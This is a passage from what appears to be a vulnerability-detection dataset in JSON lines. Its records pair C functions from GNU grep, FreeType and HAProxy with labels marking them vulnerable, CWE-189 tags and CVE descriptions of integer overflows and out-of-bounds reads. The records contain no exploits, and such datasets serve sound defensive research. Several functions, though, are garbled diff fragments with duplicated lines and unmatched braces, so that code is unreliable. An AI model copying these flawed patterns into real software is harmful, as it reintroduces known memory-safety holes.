Deal with leading context crap. */\n\n      bp = lastout ? lastout : bufbeg;\n      for (i = 0; i < out_before; ++i)\n        if (p > bp)\n          do\n            --p;\n          while (p[-1] != eol);\n\n      /* We print the SEP_STR_GROUP separator only if our output is\n         discontiguous from the last output in the file. */\n      if ((out_before || out_after) && used && p != lastout && group_separator)\n        {\n          pr_sgr_start_if (sep_color);\n          fputs (group_separator, stdout);\n          pr_sgr_end_if (sep_color);\n          fputc ('\\n', stdout);\n        }\n\n      while (p < beg)\n        {\n          char const *nl = memchr (p, eol, beg - p);\n          nl++;\n          prline (p, nl, SEP_CHAR_REJECTED);\n          p = nl;\n        }\n    }\n\n  if (nlinesp)\n    {\n      /* Caller wants a line count. */\n      for (n = 0; p < lim && n < outleft; n++)\n        {\n          char const *nl = memchr (p, eol, lim - p);\n          nl++;\n          if (!out_quiet)\n            prline (p, nl, SEP_CHAR_SELECTED);\n          p = nl;\n        }\n      *nlinesp = n;\n\n      /* relying on it that this function is never called when outleft = 0.  */\n      after_last_match = bufoffset - (buflim - p);\n    }\n  else if (!out_quiet)\n    prline (beg, lim, SEP_CHAR_SELECTED);\n\n  pending = out_quiet ? 0 : out_after;\n  used = 1;\n}\n\nstatic size_t\ndo_execute (char const *buf, size_t size, size_t *match_size, char const *start_ptr)\n{\n  size_t result;\n  const char *line_next;\n\n  /* With the current implementation, using --ignore-case with a multi-byte\n     character set is very inefficient when applied to a large buffer\n     containing many matches.  We can avoid much of the wasted effort\n     by matching line-by-line.\n\n     FIXME: this is just an ugly workaround, and it doesn't really\n     belong here.  Also, PCRE is always using this same per-line\n     matching algorithm.  Either we fix -i, or we should refactor\n     this code---for example, we could add another function pointer\n     to struct matcher to split the buffer passed to execute.  It would\n     perform the memchr if line-by-line matching is necessary, or just\n     return buf + size otherwise.  */\n  if (MB_CUR_MAX == 1 || !match_icase)\n    return execute (buf, size, match_size, start_ptr);\n\n  for (line_next = buf; line_next < buf + size; )\n    {\n      const char *line_buf = line_next;\n      const char *line_end = memchr (line_buf, eolbyte, (buf + size) - line_buf);\n      if (line_end == NULL)\n        line_next = line_end = buf + size;\n      else\n        line_next = line_end + 1;\n\n      if (start_ptr && start_ptr >= line_end)\n        continue;\n\n      result = execute (line_buf, line_next - line_buf, match_size, start_ptr);\n      if (result != (size_t) -1)\n        return (line_buf - buf) + result;\n    }\n\n  return (size_t) -1;\n}\n\n/* Scan the specified portion of the buffer, matching lines (or\n   between matching lines if OUT_INVERT is true).  Return a count of\n   lines printed. */\nstatic int\ngrepbuf (char const *beg, char const *lim)\n /* Scan the specified portion of the buffer, matching lines (or\n    between matching lines if OUT_INVERT is true).  Return a count of\n    lines printed. */\nstatic int\n grepbuf (char const *beg, char const *lim)\n {\n  int nlines, n;\n   char const *p;\n   size_t match_offset;\n   size_t match_size;\n    {\n      char const *b = p + match_offset;\n      char const *endp = b + match_size;\n      /* Avoid matching the empty line at the end of the buffer. */\n      if (b == lim)\n        break;\n      if (!out_invert)\n        {\n          prtext (b, endp, (int *) 0);\n          nlines++;\n         break;\n       if (!out_invert)\n         {\n          prtext (b, endp, (int *) 0);\n           nlines++;\n           outleft--;\n           if (!outleft || done_on_match)\n            }\n        }\n      else if (p < b)\n        {\n          prtext (p, b, &n);\n          nlines += n;\n          outleft -= n;\n          if (!outleft)\n            return nlines;\n        }\n      p = endp;\n    }\n  if (out_invert && p < lim)\n    {\n      prtext (p, lim, &n);\n      nlines += n;\n      outleft -= n;\n    }\n  return nlines;\n}\n\n/* Search a given file.  Normally, return a count of lines printed;\n   but if the file is a directory and we search it recursively, then\n   return -2 if there was a match, and -1 otherwise.  */\nstatic int\ngrep (int fd, char const *file, struct stats *stats)\n /* Search a given file.  Normally, return a count of lines printed;\n    but if the file is a directory and we search it recursively, then\n    return -2 if there was a match, and -1 otherwise.  */\nstatic int\n grep (int fd, char const *file, struct stats *stats)\n {\n  int nlines, i;\n   int not_text;\n   size_t residue, save;\n   char oldc;\n    return 0;\n\n  if (file && directories == RECURSE_DIRECTORIES\n      && S_ISDIR (stats->stat.st_mode))\n    {\n      /* Close fd now, so that we don't open a lot of file descriptors\n         when we recurse deeply.  */\n      if (close (fd) != 0)\n        suppressible_error (file, errno);\n      return grepdir (file, stats) - 2;\n    }\n\n  totalcc = 0;\n  lastout = 0;\n  totalnl = 0;\n  outleft = max_count;\n  after_last_match = 0;\n  pending = 0;\n\n  nlines = 0;\n  residue = 0;\n  save = 0;\n\n  if (! fillbuf (save, stats))\n    {\n      suppressible_error (filename, errno);\n      return 0;\n    }\n\n  not_text = (((binary_files == BINARY_BINARY_FILES && !out_quiet)\n               || binary_files == WITHOUT_MATCH_BINARY_FILES)\n              && memchr (bufbeg, eol ? '\\0' : '\\200', buflim - bufbeg));\n  if (not_text && binary_files == WITHOUT_MATCH_BINARY_FILES)\n    return 0;\n  done_on_match += not_text;\n  out_quiet += not_text;\n\n  for (;;)\n    {\n      lastnl = bufbeg;\n      if (lastout)\n        lastout = bufbeg;\n\n      beg = bufbeg + save;\n\n      /* no more data to scan (eof) except for maybe a residue -> break */\n      if (beg == buflim)\n        break;\n\n      /* Determine new residue (the length of an incomplete line at the end of\n         the buffer, 0 means there is no incomplete last line).  */\n      oldc = beg[-1];\n      beg[-1] = eol;\n      for (lim = buflim; lim[-1] != eol; lim--)\n        continue;\n      beg[-1] = oldc;\n      if (lim == beg)\n        lim = beg - residue;\n      beg -= residue;\n      residue = buflim - lim;\n\n      if (beg < lim)\n        {\n          if (outleft)\n            nlines += grepbuf (beg, lim);\n          if (pending)\n            prpending (lim);\n          if ((!outleft && !pending) || (nlines && done_on_match && !out_invert))\n            goto finish_grep;\n        }\n\n      /* The last OUT_BEFORE lines at the end of the buffer will be needed as\n         leading context if there is a matching line at the begin of the\n         next data. Make beg point to their begin.  */\n      i = 0;\n      beg = lim;\n      while (i < out_before && beg > bufbeg && beg != lastout)\n        {\n          ++i;\n          do\n            --beg;\n          while (beg[-1] != eol);\n        }\n\n      /* detect if leading context is discontinuous from last printed line.  */\n      if (beg != lastout)\n        lastout = 0;\n\n      /* Handle some details and read more data to scan.  */\n      save = residue + lim - beg;\n      if (out_byte)\n        totalcc = add_count (totalcc, buflim - bufbeg - save);\n      if (out_line)\n        nlscan (beg);\n      if (! fillbuf (save, stats))\n        {\n          suppressible_error (filename, errno);\n          goto finish_grep;\n        }\n    }\n  if (residue)\n    {\n      *buflim++ = eol;\n      if (outleft)\n        nlines += grepbuf (bufbeg + save - residue, buflim);\n      if (pending)\n        prpending (buflim);\n    }\n\n finish_grep:\n  done_on_match -= not_text;\n  out_quiet -= not_text;\n  if ((not_text & ~out_quiet) && nlines != 0)\n    printf (_(\"Binary file %s matches\\n\"), filename);\n  return nlines;\n}\n\nstatic int\ngrepfile (char const *file, struct stats *stats)\n{\n  int desc;\n  int count;\n  int status;\n grepfile (char const *file, struct stats *stats)\n {\n   int desc;\n  int count;\n   int status;\n \n   filename = (file ? file : label ? label : _(\"(standard input)\"));\n      /* Don't open yet, since that might have side effects on a device.  */\n      desc = -1;\n    }\n  else\n    {\n      /* When skipping directories, don't worry about directories\n         that can't be opened.  */\n      desc = open (file, O_RDONLY);\n      if (desc < 0 && directories != SKIP_DIRECTORIES)\n        {\n          suppressible_error (file, errno);\n          return 1;\n        }\n    }\n\n  if (desc < 0\n      ? stat (file, &stats->stat) != 0\n      : fstat (desc, &stats->stat) != 0)\n    {\n      suppressible_error (filename, errno);\n      if (file)\n        close (desc);\n      return 1;\n    }\n\n  if ((directories == SKIP_DIRECTORIES && S_ISDIR (stats->stat.st_mode))\n      || (devices == SKIP_DEVICES && (S_ISCHR (stats->stat.st_mode)\n                                      || S_ISBLK (stats->stat.st_mode)\n                                      || S_ISSOCK (stats->stat.st_mode)\n                                      || S_ISFIFO (stats->stat.st_mode))))\n    {\n      if (file)\n        close (desc);\n      return 1;\n    }\n\n  /* If there is a regular file on stdout and the current file refers\n     to the same i-node, we have to report the problem and skip it.\n     Otherwise when matching lines from some other input reach the\n     disk before we open this file, we can end up reading and matching\n     those lines and appending them to the file from which we're reading.\n     Then we'd have what appears to be an infinite loop that'd terminate\n     only upon filling the output file system or reaching a quota.\n     However, there is no risk of an infinite loop if grep is generating\n     no output, i.e., with --silent, --quiet, -q.\n     Similarly, with any of these:\n       --max-count=N (-m) (for N >= 2)\n       --files-with-matches (-l)\n       --files-without-match (-L)\n     there is no risk of trouble.\n     For --max-count=1, grep stops after printing the first match,\n     so there is no risk of malfunction.  But even --max-count=2, with\n     input==output, while there is no risk of infloop, there is a race\n     condition that could result in \"alternate\" output.  */\n  if (!out_quiet && list_files == 0 && 1 < max_count\n      && S_ISREG (out_stat.st_mode) && out_stat.st_ino\n      && SAME_INODE (stats->stat, out_stat))\n    {\n      if (! suppress_errors)\n        error (0, 0, _(\"input file %s is also the output\"), quote (filename));\n      errseen = 1;\n      if (file)\n        close (desc);\n      return 1;\n    }\n\n  if (desc < 0)\n    {\n      desc = open (file, O_RDONLY);\n      if (desc < 0)\n        {\n          suppressible_error (file, errno);\n          return 1;\n        }\n    }\n\n#if defined SET_BINARY\n  /* Set input to binary mode.  Pipes are simulated with files\n     on DOS, so this includes the case of \"foo | grep bar\".  */\n  if (!isatty (desc))\n    SET_BINARY (desc);\n#endif\n\n  count = grep (desc, file, stats);\n  if (count < 0)\n    status = count + 2;\n  else\n    {\n      if (count_matches)\n        {\n          if (out_file)\n            {\n              print_filename ();\n              if (filename_mask)\n                print_sep (SEP_CHAR_SELECTED);\n              else\n                fputc (0, stdout);\n            }\n          printf (\"%d\\n\", count);\n        }\n               else\n                 fputc (0, stdout);\n             }\n          printf (\"%d\\n\", count);\n         }\n \n       status = !count;\n\n      if (! file)\n        {\n          off_t required_offset = outleft ? bufoffset : after_last_match;\n          if (required_offset != bufoffset\n              && lseek (desc, required_offset, SEEK_SET) < 0\n              && S_ISREG (stats->stat.st_mode))\n            suppressible_error (filename, errno);\n        }\n      else\n        while (close (desc) != 0)\n          if (errno != EINTR)\n            {\n              suppressible_error (file, errno);\n              break;\n            }\n    }\n", "func_hash": 325237609142015740156610191050140922642, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2012-5667", "cve_desc": "Multiple integer overflows in GNU Grep before 2.11 might allow context-dependent attackers to execute arbitrary code via vectors involving a long input line that triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-5667"}
{"idx": 181, "project": "savannah", "commit_id": "ef1eba75187adfac750f326b563fe543dd5ff4e6", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ef1eba75187adfac750f326b563fe543dd5ff4e6", "commit_message": "None", "target": 1, "func": "  pcf_get_encodings( FT_Stream  stream,\n                     PCF_Face   face )\n  {\n    FT_Error      error;\n    FT_Memory     memory = FT_FACE( face )->memory;\n    FT_ULong      format, size;\n    int           firstCol, lastCol;\n    int           firstRow, lastRow;\n    int           nencoding, encodingOffset;\n    int           i, j, k;\n    PCF_Encoding  encoding = NULL;\n\n\n    error = pcf_seek_to_table_type( stream,\n                                    face->toc.tables,\n                                    face->toc.count,\n                                    PCF_BDF_ENCODINGS,\n                                    &format,\n                                    &size );\n    if ( error )\n      return error;\n\n    error = FT_Stream_EnterFrame( stream, 14 );\n    if ( error )\n      return error;\n\n    format = FT_GET_ULONG_LE();\n\n    if ( PCF_BYTE_ORDER( format ) == MSBFirst )\n    {\n      firstCol          = FT_GET_SHORT();\n      lastCol           = FT_GET_SHORT();\n      firstRow          = FT_GET_SHORT();\n      lastRow           = FT_GET_SHORT();\n      face->defaultChar = FT_GET_SHORT();\n    }\n    else\n    {\n      firstCol          = FT_GET_SHORT_LE();\n      lastCol           = FT_GET_SHORT_LE();\n      firstRow          = FT_GET_SHORT_LE();\n      lastRow           = FT_GET_SHORT_LE();\n      face->defaultChar = FT_GET_SHORT_LE();\n    }\n\n    FT_Stream_ExitFrame( stream );\n\n     if ( !PCF_FORMAT_MATCH( format, PCF_DEFAULT_FORMAT ) )\n       return FT_THROW( Invalid_File_Format );\n \n     FT_TRACE4(( \"pdf_get_encodings:\\n\" ));\n \n     FT_TRACE4(( \"  firstCol %d, lastCol %d, firstRow %d, lastRow %d\\n\",\n      goto Bail;\n\n    k = 0;\n    for ( i = firstRow; i <= lastRow; i++ )\n    {\n      for ( j = firstCol; j <= lastCol; j++ )\n      {\n        if ( PCF_BYTE_ORDER( format ) == MSBFirst )\n          encodingOffset = FT_GET_SHORT();\n        else\n          encodingOffset = FT_GET_SHORT_LE();\n\n        if ( encodingOffset != -1 )\n        {\n          encoding[k].enc   = i * 256 + j;\n          encoding[k].glyph = (FT_Short)encodingOffset;\n\n          FT_TRACE5(( \"  code %d (0x%04X): idx %d\\n\",\n                      encoding[k].enc, encoding[k].enc, encoding[k].glyph ));\n\n          k++;\n        }\n      }\n    }\n    FT_Stream_ExitFrame( stream );\n\n    if ( FT_RENEW_ARRAY( encoding, nencoding, k ) )\n      goto Bail;\n\n    face->nencodings = k;\n    face->encodings  = encoding;\n\n    return error;\n\n  Bail:\n    FT_FREE( encoding );\n    return error;\n  }\n", "func_hash": 176043909406430594682157391299639166951, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-9670", "cve_desc": "Multiple integer signedness errors in the pcf_get_encodings function in pcf/pcfread.c in FreeType before 2.5.4 allow remote attackers to cause a denial of service (integer overflow, NULL pointer dereference, and application crash) via a crafted PCF file that specifies negative values for the first column and first row.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9670"}
{"idx": 183, "project": "savannah", "commit_id": "257c270bd25e15890190a28a1456e7623bba4439", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=257c270bd25e15890190a28a1456e7623bba4439", "commit_message": "None", "target": 1, "func": "  tt_sbit_decoder_init( TT_SBitDecoder       decoder,\n                        TT_Face              face,\n                        FT_ULong             strike_index,\n                        TT_SBit_MetricsRec*  metrics )\n  {\n    FT_Error   error;\n    FT_Stream  stream = face->root.stream;\n    FT_ULong   ebdt_size;\n\n\n    error = face->goto_table( face, TTAG_CBDT, stream, &ebdt_size );\n    if ( error )\n      error = face->goto_table( face, TTAG_EBDT, stream, &ebdt_size );\n    if ( error )\n      error = face->goto_table( face, TTAG_bdat, stream, &ebdt_size );\n    if ( error )\n      goto Exit;\n\n    decoder->face    = face;\n    decoder->stream  = stream;\n    decoder->bitmap  = &face->root.glyph->bitmap;\n    decoder->metrics = metrics;\n\n    decoder->metrics_loaded   = 0;\n    decoder->bitmap_allocated = 0;\n\n    decoder->ebdt_start = FT_STREAM_POS();\n    decoder->ebdt_size  = ebdt_size;\n\n    decoder->eblc_base  = face->sbit_table;\n    decoder->eblc_limit = face->sbit_table + face->sbit_table_size;\n\n    /* now find the strike corresponding to the index */\n    {\n      FT_Byte*  p;\n\n\n      if ( 8 + 48 * strike_index + 3 * 4 + 34 + 1 > face->sbit_table_size )\n      {\n        error = FT_THROW( Invalid_File_Format );\n        goto Exit;\n      }\n\n      p = decoder->eblc_base + 8 + 48 * strike_index;\n\n      decoder->strike_index_array = FT_NEXT_ULONG( p );\n      p                          += 4;\n      decoder->strike_index_count = FT_NEXT_ULONG( p );\n       p                          += 34;\n       decoder->bit_depth          = *p;\n \n      if ( decoder->strike_index_array > face->sbit_table_size             ||\n           decoder->strike_index_array + 8 * decoder->strike_index_count >\n             face->sbit_table_size                                         )\n         error = FT_THROW( Invalid_File_Format );\n     }\n  }\n", "func_hash": 275985852182915999395742860178488690228, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-9666", "cve_desc": "The tt_sbit_decoder_init function in sfnt/ttsbit.c in FreeType before 2.5.4 proceeds with a count-to-size association without restricting the count value, which allows remote attackers to cause a denial of service (integer overflow and out-of-bounds read) or possibly have unspecified other impact via a crafted embedded bitmap.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9666"}
{"idx": 256, "project": "haproxy", "commit_id": "b4d05093bc89f71377230228007e69a1434c1a0c", "project_url": "https://github.com/haproxy/haproxy", "commit_url": "https://git.haproxy.org/?p=haproxy-1.5.git;a=commitdiff;h=b4d05093bc89f71377230228007e69a1434c1a0c", "commit_message": "None", "target": 1, "func": "int http_request_forward_body(struct session *s, struct channel *req, int an_bit)\n{\n\tstruct http_txn *txn = &s->txn;\n\tstruct http_msg *msg = &s->txn.req;\n\n\tif (unlikely(msg->msg_state < HTTP_MSG_BODY))\n\t\treturn 0;\n\n\tif ((req->flags & (CF_READ_ERROR|CF_READ_TIMEOUT|CF_WRITE_ERROR|CF_WRITE_TIMEOUT)) ||\n\t    ((req->flags & CF_SHUTW) && (req->to_forward || req->buf->o))) {\n\t\t/* Output closed while we were sending data. We must abort and\n\t\t * wake the other side up.\n\t\t */\n\t\tmsg->msg_state = HTTP_MSG_ERROR;\n\t\thttp_resync_states(s);\n\t\treturn 1;\n\t}\n\n\t/* Note that we don't have to send 100-continue back because we don't\n\t * need the data to complete our job, and it's up to the server to\n\t * decide whether to return 100, 417 or anything else in return of\n\t * an \"Expect: 100-continue\" header.\n\t */\n\n\tif (msg->sov > 0) {\n\t\t/* we have msg->sov which points to the first byte of message\n\t\t * body, and req->buf.p still points to the beginning of the\n\t\t * message. We forward the headers now, as we don't need them\n\t\t * anymore, and we want to flush them.\n\t\t */\n\t\tb_adv(req->buf, msg->sov);\n\t\tmsg->next -= msg->sov;\n\t\tmsg->sov = 0;\n\n\t\t/* The previous analysers guarantee that the state is somewhere\n\t\t * between MSG_BODY and the first MSG_DATA. So msg->sol and\n\t\t * msg->next are always correct.\n\t\t */\n\t\tif (msg->msg_state < HTTP_MSG_CHUNK_SIZE) {\n\t\t\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\t\t\tmsg->msg_state = HTTP_MSG_CHUNK_SIZE;\n\t\t\telse\n\t\t\t\tmsg->msg_state = HTTP_MSG_DATA;\n\t\t}\n\t}\n\n\t/* Some post-connect processing might want us to refrain from starting to\n\t * forward data. Currently, the only reason for this is \"balance url_param\"\n\t * whichs need to parse/process the request after we've enabled forwarding.\n\t */\n\tif (unlikely(msg->flags & HTTP_MSGF_WAIT_CONN)) {\n\t\tif (!(s->rep->flags & CF_READ_ATTACHED)) {\n\t\t\tchannel_auto_connect(req);\n\t\t\treq->flags |= CF_WAKE_CONNECT;\n\t\t\tgoto missing_data;\n\t\t}\n\t\tmsg->flags &= ~HTTP_MSGF_WAIT_CONN;\n\t}\n\n\t/* in most states, we should abort in case of early close */\n\tchannel_auto_close(req);\n\n\tif (req->to_forward) {\n\t\t/* We can't process the buffer's contents yet */\n\t\treq->flags |= CF_WAKE_WRITE;\n\t\tgoto missing_data;\n\t}\n\n\twhile (1) {\n\t\tif (msg->msg_state == HTTP_MSG_DATA) {\n\t\t\t/* must still forward */\n\t\t\t/* we may have some pending data starting at req->buf->p */\n\t\t\tif (msg->chunk_len > req->buf->i - msg->next) {\n\t\t\t\treq->flags |= CF_WAKE_WRITE;\n\t\t\t\tgoto missing_data;\n\t\t\t}\n\t\t\tmsg->next += msg->chunk_len;\n\t\t\tmsg->chunk_len = 0;\n\n\t\t\t/* nothing left to forward */\n\t\t\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\t\t\tmsg->msg_state = HTTP_MSG_CHUNK_CRLF;\n\t\t\telse\n\t\t\t\tmsg->msg_state = HTTP_MSG_DONE;\n\t\t}\n\t\telse if (msg->msg_state == HTTP_MSG_CHUNK_SIZE) {\n\t\t\t/* read the chunk size and assign it to ->chunk_len, then\n\t\t\t * set ->next to point to the body and switch to DATA or\n\t\t\t * TRAILERS state.\n\t\t\t */\n\t\t\tint ret = http_parse_chunk_size(msg);\n\n\t\t\tif (ret == 0)\n\t\t\t\tgoto missing_data;\n\t\t\telse if (ret < 0) {\n\t\t\t\tsession_inc_http_err_ctr(s);\n\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, HTTP_MSG_CHUNK_SIZE, s->be);\n\t\t\t\tgoto return_bad_req;\n\t\t\t}\n\t\t\t/* otherwise we're in HTTP_MSG_DATA or HTTP_MSG_TRAILERS state */\n\t\t}\n\t\telse if (msg->msg_state == HTTP_MSG_CHUNK_CRLF) {\n\t\t\t/* we want the CRLF after the data */\n\t\t\tint ret = http_skip_chunk_crlf(msg);\n\n\t\t\tif (ret == 0)\n\t\t\t\tgoto missing_data;\n\t\t\telse if (ret < 0) {\n\t\t\t\tsession_inc_http_err_ctr(s);\n\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, HTTP_MSG_CHUNK_CRLF, s->be);\n\t\t\t\tgoto return_bad_req;\n\t\t\t}\n\t\t\t/* we're in MSG_CHUNK_SIZE now */\n\t\t}\n\t\telse if (msg->msg_state == HTTP_MSG_TRAILERS) {\n\t\t\tint ret = http_forward_trailers(msg);\n\n\t\t\tif (ret == 0)\n\t\t\t\tgoto missing_data;\n\t\t\telse if (ret < 0) {\n\t\t\t\tsession_inc_http_err_ctr(s);\n\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, HTTP_MSG_TRAILERS, s->be);\n\t\t\t\tgoto return_bad_req;\n\t\t\t}\n\t\t\t/* we're in HTTP_MSG_DONE now */\n\t\t}\n\t\telse {\n\t\t\tint old_state = msg->msg_state;\n\n\t\t\t/* other states, DONE...TUNNEL */\n\n\t\t\t/* we may have some pending data starting at req->buf->p\n                         * such as last chunk of data or trailers.\n                         */\n                        b_adv(req->buf, msg->next);\n                       if (unlikely(!(s->rep->flags & CF_READ_ATTACHED)))\n                                msg->sov -= msg->next;\n                        msg->next = 0;\n \n\t\t\t/* for keep-alive we don't want to forward closes on DONE */\n\t\t\tif ((txn->flags & TX_CON_WANT_MSK) == TX_CON_WANT_KAL ||\n\t\t\t    (txn->flags & TX_CON_WANT_MSK) == TX_CON_WANT_SCL)\n\t\t\t\tchannel_dont_close(req);\n\t\t\tif (http_resync_states(s)) {\n\t\t\t\t/* some state changes occurred, maybe the analyser\n\t\t\t\t * was disabled too.\n\t\t\t\t */\n\t\t\t\tif (unlikely(msg->msg_state == HTTP_MSG_ERROR)) {\n\t\t\t\t\tif (req->flags & CF_SHUTW) {\n\t\t\t\t\t\t/* request errors are most likely due to\n\t\t\t\t\t\t * the server aborting the transfer.\n\t\t\t\t\t\t */\n\t\t\t\t\t\tgoto aborted_xfer;\n\t\t\t\t\t}\n\t\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, old_state, s->be);\n\t\t\t\t\tgoto return_bad_req;\n\t\t\t\t}\n\t\t\t\treturn 1;\n\t\t\t}\n\n\t\t\t/* If \"option abortonclose\" is set on the backend, we\n\t\t\t * want to monitor the client's connection and forward\n\t\t\t * any shutdown notification to the server, which will\n\t\t\t * decide whether to close or to go on processing the\n\t\t\t * request.\n\t\t\t */\n\t\t\tif (s->be->options & PR_O_ABRT_CLOSE) {\n\t\t\t\tchannel_auto_read(req);\n\t\t\t\tchannel_auto_close(req);\n\t\t\t}\n\t\t\telse if (s->txn.meth == HTTP_METH_POST) {\n\t\t\t\t/* POST requests may require to read extra CRLF\n\t\t\t\t * sent by broken browsers and which could cause\n\t\t\t\t * an RST to be sent upon close on some systems\n\t\t\t\t * (eg: Linux).\n\t\t\t\t */\n\t\t\t\tchannel_auto_read(req);\n\t\t\t}\n\n\t\t\treturn 0;\n\t\t}\n\t}\n\n  missing_data:\n        /* we may have some pending data starting at req->buf->p */\n        b_adv(req->buf, msg->next);\n       if (unlikely(!(s->rep->flags & CF_READ_ATTACHED)))\n                msg->sov -= msg->next + MIN(msg->chunk_len, req->buf->i);\n \n        msg->next = 0;\n\tmsg->chunk_len -= channel_forward(req, msg->chunk_len);\n\n\t/* stop waiting for data if the input is closed before the end */\n\tif (req->flags & CF_SHUTR) {\n\t\tif (!(s->flags & SN_ERR_MASK))\n\t\t\ts->flags |= SN_ERR_CLICL;\n\t\tif (!(s->flags & SN_FINST_MASK)) {\n\t\t\tif (txn->rsp.msg_state < HTTP_MSG_ERROR)\n\t\t\t\ts->flags |= SN_FINST_H;\n\t\t\telse\n\t\t\t\ts->flags |= SN_FINST_D;\n\t\t}\n\n\t\ts->fe->fe_counters.cli_aborts++;\n\t\ts->be->be_counters.cli_aborts++;\n\t\tif (objt_server(s->target))\n\t\t\tobjt_server(s->target)->counters.cli_aborts++;\n\n\t\tgoto return_bad_req_stats_ok;\n\t}\n\n\t/* waiting for the last bits to leave the buffer */\n\tif (req->flags & CF_SHUTW)\n\t\tgoto aborted_xfer;\n\n\t/* When TE: chunked is used, we need to get there again to parse remaining\n\t * chunks even if the client has closed, so we don't want to set CF_DONTCLOSE.\n\t */\n\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\tchannel_dont_close(req);\n\n\t/* We know that more data are expected, but we couldn't send more that\n\t * what we did. So we always set the CF_EXPECT_MORE flag so that the\n\t * system knows it must not set a PUSH on this first part. Interactive\n\t * modes are already handled by the stream sock layer. We must not do\n\t * this in content-length mode because it could present the MSG_MORE\n\t * flag with the last block of forwarded data, which would cause an\n\t * additional delay to be observed by the receiver.\n\t */\n\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\treq->flags |= CF_EXPECT_MORE;\n\n\treturn 0;\n\n return_bad_req: /* let's centralize all bad requests */\n\ts->fe->fe_counters.failed_req++;\n\tif (s->listener->counters)\n\t\ts->listener->counters->failed_req++;\n\n return_bad_req_stats_ok:\n\t/* we may have some pending data starting at req->buf->p */\n\tb_adv(req->buf, msg->next);\n\tmsg->next = 0;\n\n\ttxn->req.msg_state = HTTP_MSG_ERROR;\n\tif (txn->status) {\n\t\t/* Note: we don't send any error if some data were already sent */\n\t\tstream_int_retnclose(req->prod, NULL);\n\t} else {\n\t\ttxn->status = 400;\n\t\tstream_int_retnclose(req->prod, http_error_message(s, HTTP_ERR_400));\n\t}\n\treq->analysers = 0;\n\ts->rep->analysers = 0; /* we're in data phase, we want to abort both directions */\n\n\tif (!(s->flags & SN_ERR_MASK))\n\t\ts->flags |= SN_ERR_PRXCOND;\n\tif (!(s->flags & SN_FINST_MASK)) {\n\t\tif (txn->rsp.msg_state < HTTP_MSG_ERROR)\n\t\t\ts->flags |= SN_FINST_H;\n\t\telse\n\t\t\ts->flags |= SN_FINST_D;\n\t}\n\treturn 0;\n\n aborted_xfer:\n\ttxn->req.msg_state = HTTP_MSG_ERROR;\n\tif (txn->status) {\n\t\t/* Note: we don't send any error if some data were already sent */\n\t\tstream_int_retnclose(req->prod, NULL);\n\t} else {\n\t\ttxn->status = 502;\n\t\tstream_int_retnclose(req->prod, http_error_message(s, HTTP_ERR_502));\n\t}\n\treq->analysers = 0;\n\ts->rep->analysers = 0; /* we're in data phase, we want to abort both directions */\n\n\ts->fe->fe_counters.srv_aborts++;\n\ts->be->be_counters.srv_aborts++;\n\tif (objt_server(s->target))\n\t\tobjt_server(s->target)->counters.srv_aborts++;\n\n\tif (!(s->flags & SN_ERR_MASK))\n\t\ts->flags |= SN_ERR_SRVCL;\n\tif (!(s->flags & SN_FINST_MASK)) {\n\t\tif (txn->rsp.msg_state < HTTP_MSG_ERROR)\n\t\t\ts->flags |= SN_FINST_H;\n\t\telse\n\t\t\ts->flags |= SN_FINST_D;\n\t}\n\treturn 0;\n}\n", "func_hash": 74231898713312769363715897872246138359, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-6269", "cve_desc": "Multiple integer overflows in the http_request_forward_body function in proto_http.c in HAProxy 1.5-dev23 before 1.5.4 allow remote attackers to cause a denial of service (crash) via a large stream of data, which triggers a buffer overflow and an out-of-bounds read.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6269"}
{"idx": 265, "project": "savannah", "commit_id": "6305b869d86ff415a33576df6d43729673c66eee", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6305b869d86ff415a33576df6d43729673c66eee", "commit_message": "None", "target": 1, "func": "  gray_render_span( int             y,\n                    int             count,\n                    const FT_Span*  spans,\n                    PWorker         worker )\n  {\n    unsigned char*  p;\n    FT_Bitmap*      map = &worker->target;\n\n\n     /* first of all, compute the scanline offset */\n     p = (unsigned char*)map->buffer - y * map->pitch;\n     if ( map->pitch >= 0 )\n      p += ( map->rows - 1 ) * map->pitch;\n \n     for ( ; count > 0; count--, spans++ )\n     {\n      unsigned char  coverage = spans->coverage;\n\n\n      if ( coverage )\n      {\n        /* For small-spans it is faster to do it by ourselves than\n         * calling `memset'.  This is mainly due to the cost of the\n         * function call.\n         */\n        if ( spans->len >= 8 )\n          FT_MEM_SET( p + spans->x, (unsigned char)coverage, spans->len );\n        else\n        {\n          unsigned char*  q = p + spans->x;\n\n\n          switch ( spans->len )\n          {\n          case 7: *q++ = (unsigned char)coverage;\n          case 6: *q++ = (unsigned char)coverage;\n          case 5: *q++ = (unsigned char)coverage;\n          case 4: *q++ = (unsigned char)coverage;\n          case 3: *q++ = (unsigned char)coverage;\n          case 2: *q++ = (unsigned char)coverage;\n          case 1: *q   = (unsigned char)coverage;\n          default:\n            ;\n          }\n        }\n      }\n    }\n  }\n", "func_hash": 233903124056505689403424392136593938770, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": 